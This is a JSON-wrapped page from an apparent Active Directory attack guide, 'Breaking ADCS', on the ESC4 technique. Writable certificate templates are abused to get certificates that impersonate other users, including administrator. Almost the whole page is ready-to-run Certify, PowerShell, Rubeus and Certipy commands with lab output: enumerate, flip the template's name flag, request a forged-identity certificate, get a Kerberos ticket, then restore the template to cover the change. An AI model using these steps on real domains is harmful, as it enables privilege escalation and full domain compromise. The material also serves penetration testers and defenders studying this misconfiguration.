{"title": "ESC4: Vulnerable Certificate Template ACL", "source": "breaking-adcs", "source_label": "Breaking ADCS", "path": "esc4", "html": "<p><strong>Conditions:</strong> You have <code>WriteProperty</code>, <code>WriteOwner</code>, or <code>WriteDacl</code> on a certificate template object. Strategy: modify template to enable ESC1 conditions → exploit → clean up.</p>\n<h3>Step 1 — Enumerate + Identify Writable Template</h3>\n<pre><code class=\"language-bash\">Certify.exe find /vulnerable</code></pre>\n<pre><code class=\"language-bash\">Certify.exe find /vulnerable\n\n    Template Name                 : ESC4\n    pkiextendedkeyusage           : Client Authentication\n    Enrollment Rights             : ESSOS\\Domain Users    Access: Allow\n    Object Control Permissions\n      WriteProperty Principals    : ESSOS\\khal.drogo     Access: Allow</code></pre>\n<h3>Step 2 — Modify Template to Enable ENROLLEE_SUPPLIES_SUBJECT</h3>\n<pre><code class=\"language-powershell\"># Backup template\nGet-ADObject &quot;CN=&lt;template&gt;,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=&lt;domain&gt;,DC=local&quot; -Properties * | Export-Clixml backup.xml\n\n# Enable ENROLLEE_SUPPLIES_SUBJECT flag\n$t = Get-ADObject &quot;CN=&lt;template&gt;,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=&lt;domain&gt;,DC=local&quot;\nSet-ADObject $t.DistinguishedName -Replace @{&quot;msPKI-Certificate-Name-Flag&quot;=1}\nStart-Sleep -Seconds 30</code></pre>\n<pre><code class=\"language-powershell\"># Backup original template\nGet-ADObject &quot;CN=ESC4,CN=Certificate Templates,...&quot; -Properties * | Export-Clixml ESC4-backup.xml\n\n# Modify template to enable ENROLLEE_SUPPLIES_SUBJECT\n$template = Get-ADObject &quot;CN=ESC4,CN=Certificate Templates,...&quot;\nSet-ADObject $template.DistinguishedName -Replace @{&quot;msPKI-Certificate-Name-Flag&quot;=1}\nStart-Sleep -Seconds 30</code></pre>\n<h3>Step 3 — Request Certificate with Arbitrary SAN</h3>\n<pre><code class=\"language-bash\">Certify.exe request /ca:&lt;ca-host&gt;\\&lt;ca-name&gt; /template:&lt;template&gt; /altname:upn:&lt;target-user&gt;@&lt;domain&gt;</code></pre>\n<pre><code class=\"language-bash\">Certify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:ESC4 /altname:upn:administrator@essos.local\n\n[*] AltName   : administrator@essos.local\n[*] CA Response : The certificate has been issued.\n[*] Request ID  : 11</code></pre>\n<h3>Step 4 — Authenticate</h3>\n<pre><code class=\"language-bash\">Rubeus.exe asktgt /user:&lt;target-user&gt; /certificate:&lt;target-user&gt;.pfx</code></pre>\n<h3>Step 5 — Restore Template (Cleanup!)</h3>\n<pre><code class=\"language-powershell\">$t = Get-ADObject &quot;CN=&lt;template&gt;,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=&lt;domain&gt;,DC=local&quot;\nSet-ADObject $t.DistinguishedName -Replace @{&quot;msPKI-Certificate-Name-Flag&quot;=0}</code></pre>\n<pre><code class=\"language-powershell\"># IMPORTANT: Restore original template after attack\n$template = Get-ADObject &quot;CN=ESC4,CN=Certificate Templates,...&quot;\nSet-ADObject $template.DistinguishedName -Replace @{&quot;msPKI-Certificate-Name-Flag&quot;=0}</code></pre>\n\n<h3>Alternative — Certipy (Linux)</h3>\n<pre><code class=\"language-bash\"># ESC4 (write access over the template) - overwrite it to be ESC1-vulnerable, abuse, then restore.\n# Step 1 - make the template vulnerable (backs up the original config)\ncertipy template -u &lt;username&gt;@&lt;domain&gt; -p &lt;password&gt; -dc-ip &lt;dc-ip&gt; -template &lt;template&gt; -write-default-configuration\n# Step 2 - abuse as ESC1 (forge SAN/UPN + SID)\ncertipy req -u &lt;username&gt;@&lt;domain&gt; -p &lt;password&gt; -dc-ip &lt;dc-ip&gt; -target &lt;ca-host&gt; -ca &lt;ca-name&gt; -template &lt;template&gt; -upn &lt;target-user&gt;@&lt;domain&gt; -sid &lt;target-sid&gt;\ncertipy auth -pfx &lt;target-user&gt;.pfx -dc-ip &lt;dc-ip&gt;\n# Step 3 - restore the original template configuration\ncertipy template -u &lt;username&gt;@&lt;domain&gt; -p &lt;password&gt; -dc-ip &lt;dc-ip&gt; -template &lt;template&gt; -write-configuration &lt;template&gt;.json</code></pre>", "excerpt": "Conditions: You have WriteProperty , WriteOwner , or WriteDacl on a certificate template object. Strategy: modify template to enable ESC1 conditions → exploit → clean up. Step 1 — Enumerate + Identify", "tags": ["adcs", "active-directory", "certificates"]}